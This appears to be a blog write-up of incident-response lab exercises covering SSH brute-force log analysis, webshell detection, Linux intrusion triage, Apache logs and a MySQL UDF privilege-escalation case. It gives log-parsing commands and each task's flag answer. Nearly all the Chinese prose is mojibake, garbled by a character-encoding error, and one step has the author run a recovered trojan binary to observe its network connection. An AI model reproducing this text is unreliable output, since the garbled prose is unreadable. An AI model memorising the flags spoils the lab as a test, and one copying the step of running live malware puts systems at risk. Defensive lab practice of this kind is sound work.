<p>è¿™é‡Œ auth æ—¥å¿—æœ‰ä¸¤æ¡ï¼Œåˆ†åˆ«æ˜¯<code>auth.log</code>å’Œ<code>auth.log.1</code>ï¼Œæˆ‘ä»¬çš„åˆ¤æ–­åŸºç¡€æ˜¯è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…¶æ¬¡è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­å‡ºå“ªäº›çˆ†ç ´çš„æ˜¯ Root è´¦å·ï¼Œæ‰€ä»¥éœ€è¦æœç´¢ â€œFailed password for rootâ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‹“å±•ï¼š</span><br><span class="line">.1 è¡¨ç¤ºè¾ƒæ—©çš„æ—¥å¿—æ–‡ä»¶ï¼Œè€Œæ²¡æœ‰ .1 çš„æ–‡ä»¶æ˜¯å½“å‰çš„æ—¥å¿—æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨grepå»è¿›è¡ŒæŸ¥æ‰¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password for root&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/74b48a05cdfb4800616bc807fbcb31d2--d076--image-20240603210808371.png" alt="image-20240603210808371"></p>
<p>ä½¿ç”¨awkè¿›è¡Œipæå–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| awk &#x27;&#123;print $11&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨sortæ’åºï¼Œä½¿ç”¨unip -c è¿›è¡Œå»é‡ï¼Œä½¿ç”¨sort -nrè¿›è¡Œé™åºæ’åº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/62ed66c571e83333a1943dd791734695--300b--image-20240603211111911.png" alt="image-20240603211111911"></p>
<p>æˆåŠŸè·å–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 192.168.200.2</span><br><span class="line">1 192.168.200.32</span><br><span class="line">1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ"><a href="#ä»»åŠ¡äºŒ" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><p>2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/1abf55deb21c8f1fe461ea49fd144171--5b7b--image-20240603211809586.png" alt="image-20240603211809586"></p>
<p>è¿™é‡ŒæˆåŠŸæ‰¾åˆ°ç™»å½•æˆåŠŸä¼šæœ‰Acceptedå‡ºç°ï¼Œæˆ‘ä»¬æŒ‰ä¸Šé¢åšçš„é‚£æ ·å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Accepted&quot; | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 192.168.200.2</span><br><span class="line">1 221.130.58.74</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œ221å¼€å¤´çš„ipæ˜¯æˆ‘ä»¬æœ¬æœºç™»å½•çš„ipï¼Œæ‰€ä»¥åº”è¯¥å‰”é™¤æ‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰"><a href="#ä»»åŠ¡ä¸‰" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><p>3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</p>
<p>ç›´æ¥è¿˜æ˜¯æå–</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/166eefc9427d7cc88c7dce4e154b5ef1--0ad4--image-20240603213108197.png" alt="image-20240603213108197"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±å¯ä»¥ç›´æ¥æ‹¿åˆ°å­—å…¸äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªperlè¯­è¨€</p>
<h4 id="ä»»åŠ¡å››"><a href="#ä»»åŠ¡å››" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><p>4.æˆåŠŸç™»å½• root ç”¨æˆ·çš„ ip ä¸€å…±çˆ†ç ´äº†å¤šå°‘æ¬¡</p>
<p>å…¶å®ç¬¬ä¸€é—®çš„æ—¶å€™å·²ç»çœ‹åˆ°äº†çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/e47bb3e3102e99f799387197b0fc70b1--0f87--image-20240603214219501.png" alt="image-20240603214219501"></p>
<p>ç›´æ¥å‡ºå°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | awk &#x27;&#123;if($11==&quot;192.168.200.2&quot;) print $11&#125;&#x27;|sort|uniq -c</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”"><a href="#ä»»åŠ¡äº”" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><p>5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/5b59259fb061754a82bc6ef3f20df148--5c64--image-20240603214722593.png" alt="image-20240603214722593"></p>
<p>åœ¨è¿™ä¸ªåœ°æ–¹æ³¨æ„ï¼Œé»‘å®¢æ·»åŠ äº†test2è¿™ä¸ªç”¨æˆ·ä½œä¸ºåé—¨</p>
<p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œåè¾¹æœ‰ä¸ªdebianç”¨æˆ·çš„åˆ›å»ºï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬sshè¿æ¥çš„ç”¨æˆ·ï¼Œä¸æ˜¯é»‘å®¢åˆ›å»ºçš„</p>
<h2 id="webshellæŸ¥æ€"><a href="#webshellæŸ¥æ€" class="headerlink" title="webshellæŸ¥æ€"></a>webshellæŸ¥æ€</h2><h4 id="ä»»åŠ¡ä¸€-1"><a href="#ä»»åŠ¡ä¸€-1" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><p>é»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>
<p>ç›´æ¥ç”¨dç›¾æˆ–è€…ç«ç»’å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/7f34907dd43c478bf4b991a92418db09--7a2e--image-20240603234947461.png" alt="image-20240603234947461"></p>
<p>ç›´æ¥å°±æ˜¯æ‰¾åˆ°æ˜¯gz.php</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/24f58c7eca7ca7fc6e83f75d013ef857--cdde--image-20240603235135992.png" alt="image-20240603235135992"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-1"><a href="#ä»»åŠ¡äºŒ-1" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><p>é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}</p>
<p>ç›´æ¥æœç´¢</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/3178fa94b8a77dfdb2ffde23fc26ea95--8adb--image-20240603235243396.png" alt="image-20240603235243396"></p>
<p>å‘ç°æ˜¯å“¥æ–¯æ‹‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;39392de3218c333f794befef07ac9257&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-1"><a href="#ä»»åŠ¡ä¸‰-1" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><p>é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</p>
<p>è¿˜æ˜¯ä¸Šé¢dç›¾ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-1"><a href="#ä»»åŠ¡å››-1" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><p>4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}</p>
<p>è¿˜æ˜¯ä¸€æ ·çš„ï¼Œä¹‹å‰éƒ½ç›´æ¥dç›¾æ‰«å‡ºæ¥äº†çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åè¿™æ€»ç»“ä¸€ä¸‹ï¼ŒDç›¾çœŸæ˜¯å¥½å¥½ç”¨ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p>
<p>è¿™é‡Œè®°å½•ä¸€ä¸‹ä¸€äº›å¸¸è§çš„webshellæŸ¥æ€å·¥å…·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€‚é˜¿é‡Œä¼é­”</span><br><span class="line">https://ti.aliyun.com/#/webshell</span><br><span class="line">2ã€ç™¾åº¦ WEBDIR+</span><br><span class="line">https://scanner.baidu.com/#/pages/intro</span><br><span class="line">3ã€æ²³é©¬</span><br><span class="line">https://n.shellpub.com/</span><br><span class="line">4ã€CloudWalker(ç‰§äº‘)</span><br><span class="line">https://stack.chaitin.com/security-challenge/webshell</span><br><span class="line">5ã€åœ¨çº¿ webshell æŸ¥æ€-ç­ç»å¸ˆå¤ªç‰ˆ</span><br><span class="line">http://tools.bugscaner.com/killwebshell/</span><br><span class="line">6ã€WebShell Detector WebShell æ‰«ææ£€æµ‹å™¨</span><br><span class="line">http://www.shelldetector.com/</span><br><span class="line">7ã€D ç›¾</span><br><span class="line">http://www.d99net.net</span><br><span class="line">8ã€å¾®æ­¥</span><br><span class="line">https://threatbook.cn/next/product/sandbox</span><br></pre></td></tr></table></figure>

<h2 id="Linuxå…¥ä¾µæ’æŸ¥"><a href="#Linuxå…¥ä¾µæ’æŸ¥" class="headerlink" title="Linuxå…¥ä¾µæ’æŸ¥"></a>Linuxå…¥ä¾µæ’æŸ¥</h2><h4 id="ä»»åŠ¡ä¸€-2"><a href="#ä»»åŠ¡ä¸€-2" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯ä¸¢dç›¾é‡Œå»å°±æ˜¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/756f0698f82fc286b735a6cd1d541f56--e870--image-20240604143457279.png" alt="image-20240604143457279"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-2"><a href="#ä»»åŠ¡äºŒ-2" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯.shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-2"><a href="#ä»»åŠ¡ä¸‰-2" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/575e977540b418a47bd0f108845a391f--3128--image-20240604143824876.png" alt="image-20240604143824876"></p>
<p>å¾ˆæ˜æ˜¾å°±èƒ½æ‰¾åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;index.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-2"><a href="#ä»»åŠ¡å››-2" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;10.11.55.21&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-1"><a href="#ä»»åŠ¡äº”-1" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3333&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥ä¸¤ä¸ªä¸€èµ·åšå°±è¡Œï¼Œæˆ‘ä»¬å‘ç°åœ¨ç½‘é¡µç›®å½•ä¸‹æœ‰ä¸ªshell.elfæœ¨é©¬æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å»è¿è¡Œå®ƒï¼Œç„¶åå†å»æŸ¥çœ‹netstatå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤è¯¦è§£ï¼š</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/46b380015231d41b240008156e3e0547--bbc4--image-20240604165924985.png" alt="image-20240604165924985"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/c030043dac3b057b133fd28fb55889e4--7864--image-20240604144504373.png" alt="image-20240604144504373"></p>
<h1 id="ç¬¬äºŒç« -æ—¥å¿—åˆ†æ"><a href="#ç¬¬äºŒç« -æ—¥å¿—åˆ†æ" class="headerlink" title="ç¬¬äºŒç« -æ—¥å¿—åˆ†æ"></a>ç¬¬äºŒç« -æ—¥å¿—åˆ†æ</h1><h2 id="apacheæ—¥å¿—åˆ†æ"><a href="#apacheæ—¥å¿—åˆ†æ" class="headerlink" title="apacheæ—¥å¿—åˆ†æ"></a>apacheæ—¥å¿—åˆ†æ</h2><h4 id="ä»»åŠ¡ä¸€-3"><a href="#ä»»åŠ¡ä¸€-3" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;03/Aug&quot; | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/84d28fd8c5a98ca0d89ec8784038dd6e--38ff--image-20240604150902123.png" alt="image-20240604150902123"></p>
<p>ç›´æ¥æ‰¾å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-3"><a href="#ä»»åŠ¡äºŒ-3" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/fcad17feb5fa9f587876e73751cf967b--3ce9--image-20240604151216742.png" alt="image-20240604151216742"></p>
<p>å‘ç°æµè§ˆå™¨æŒ‡çº¹å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-3"><a href="#ä»»åŠ¡ä¸‰-3" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;/index.php&quot; | awk &#x27;&#123;print $1&#125;&#x27; |uniq -c</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯27æ¬¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-3"><a href="#ä»»åŠ¡å››-3" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;192.168.200.2 - -&quot; |awk &#x27;&#123;print $1&#125;&#x27;|uniq -c</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æŠ“ipå°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<p>ä»»åŠ¡äº”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;03/Aug/2023:08:&quot; |awk &#x27;&#123;print $1&#125;&#x27;|sort | uniq -c</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/412f4b8562c37d19218dfc4c0c839e92--9f50--image-20240604152206000.png" alt="image-20240604152206000"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;     5ä¸ªip</span><br></pre></td></tr></table></figure>

<h2 id="mysqlåº”æ€¥å“åº”"><a href="#mysqlåº”æ€¥å“åº”" class="headerlink" title="mysqlåº”æ€¥å“åº”"></a>mysqlåº”æ€¥å“åº”</h2><h4 id="ä»»åŠ¡ä¸€-4"><a href="#ä»»åŠ¡ä¸€-4" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag&#123;å…³é”®å­—ç¬¦ä¸²&#125; </span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯dç›¾æ‰«æå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/c9e4ca70d5f748e2e078c2f37a43ff69--eec0--image-20240604162746569.png" alt="image-20240604162746569"></p>
<p>ç„¶åå°±æ‰¾åˆ°äº†ï¼Œåœ¨sh.phpä¸­</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/0a2bcff864b56870d0d10744161376f9--3b8c--image-20240604162812922.png" alt="image-20240604162812922"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-4"><a href="#ä»»åŠ¡äºŒ-4" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.é»‘å®¢åå¼¹shellçš„ip flag&#123;ip&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å»æŸ¥çœ‹mysqlçš„æ—¥å¿—å»åˆ†æ   &#x2F;var&#x2F;log&#x2F;mysql&#x2F;</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/5c0faa16d71af08b1b7075b0f32cd94d--f10c--image-20240604163143457.png" alt="image-20240604163143457"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-4"><a href="#ä»»åŠ¡ä¸‰-4" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125; æ³¨ /xxx/xxx/xxx/xxx/xxx.xx</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¹‹å‰çš„mysqlæ—¥å¿—ï¼Œæˆ‘ä»¬å‘ç°æœ‰ä¸€ä¸ªæ•æ„Ÿæ–‡ä»¶1.sh</p>
<p>æˆ‘ä»¬å°è¯•å»æ‰¾ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/302186179a7c28099e8e27a12fb462f0--cbc5--image-20240604163448110.png" alt="image-20240604163448110"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªï¼Œè¿™ä¸€ä¸ªå°±æ˜¯åå¼¹shellçš„</p>
<p>â€”â€”åˆ°è¿™é‡Œå¥½åƒå•¥éƒ½æ²¡ç”¨</p>
<p>è¿™é‡Œå°±åº”è¯¥å»æƒ³ä¸€ä¸‹æˆ‘ä»¬åº”è¯¥æ˜¯æ€ä¹ˆæ”»å‡»çš„ï¼Œå‘ç°åœ¨ &#x2F;var&#x2F;www&#x2F;html ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ª common.php æ–‡ä»¶ï¼Œé‚£ä¹ˆé»‘å®¢åº”è¯¥æ˜¯é€šè¿‡å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ¢æµ‹çš„æ—¶å€™å‘ç°äº†æ­¤æ–‡ä»¶ï¼Œæ°å¥½æ­¤æ–‡ä»¶è¿˜æ³„éœ²äº†æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ï¼Œé‚£ä¹ˆä»–çš„å¸¸è§„æ“ä½œè‚¯å®šæ˜¯è¿œç¨‹è¿æ¥ä¸Šäº†æ•°æ®åº“åå†ä»æ•°æ®åº“ä½œä¸ºåˆ‡å…¥ç‚¹è¿›è¡Œææƒï¼Œmysql çš„å¸¸è§ææƒæ–¹å¼å°±æ˜¯ UDF ææƒ<br>ç„¶åå†æ ¹æ®UDFææƒçš„ç‰¹æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UDF ææƒè‚¯å®šä¼šåœ¨ /usr/lib/mysql/plugin/ è·¯å¾„ä¸‹ç•™ä¸‹æ”»å‡»ç—•è¿¹</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/2f4d33594702d01d1229dbae670548ef--2e6b--image-20240604163947174.png" alt="image-20240604163947174"></p>
<p>æˆåŠŸçŸ¥é“è·¯å¾„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/mysql/plugin/udf.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;b1818bde4e310f3d23f1005185b973e7&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-4"><a href="#ä»»åŠ¡å››-4" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.é»‘å®¢è·å–çš„æƒé™ flag&#123;whoamiåçš„å€¼&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤è¯¦è§£ï¼š</span><br><span class="line">ps      æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€</span><br><span class="line">-a      æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„æ‰€æœ‰è¿›ç¨‹</span><br><span class="line">-u      ä»¥ä¸€ç§é¢å‘ç”¨æˆ·çš„æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ· IDã€CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ã€å‘½ä»¤åç­‰ã€‚</span><br><span class="line">-x      è®© ps å‘½ä»¤æ˜¾ç¤ºæ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/b98b564106ffc9a6e9fe7ca1f03d1408--e482--image-20240604164233769.png" alt="image-20240604164233769"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯mysqlæƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

